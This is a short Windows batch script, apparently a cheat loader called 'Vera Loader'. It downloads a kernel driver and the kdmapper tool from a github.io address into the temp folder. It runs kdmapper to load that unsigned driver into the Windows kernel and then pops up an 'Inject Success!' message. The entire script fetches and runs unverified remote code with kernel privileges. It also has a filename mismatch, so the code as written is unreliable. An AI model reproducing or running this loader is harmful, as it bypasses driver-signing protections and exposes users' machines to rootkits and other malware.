@echo off
cd %temp%
del driver.sys
curl -o driver.sys https://getserver.github.io/api/keysys/driver.sys
cls
curl -o kdmapper_Release.exe.exe https://getserver.github.io/api/keysys/kdmapper_Release.exe
cls

"kdmapper_Release.exe" "driver.sys"

set VBScriptFile=temp.vbs

(
  echo MsgBox "Inject Success!", vbInformation, "Vera Loader"
) > %VBScriptFile%

cscript //nologo %VBScriptFile%
del %VBScriptFile%
exit

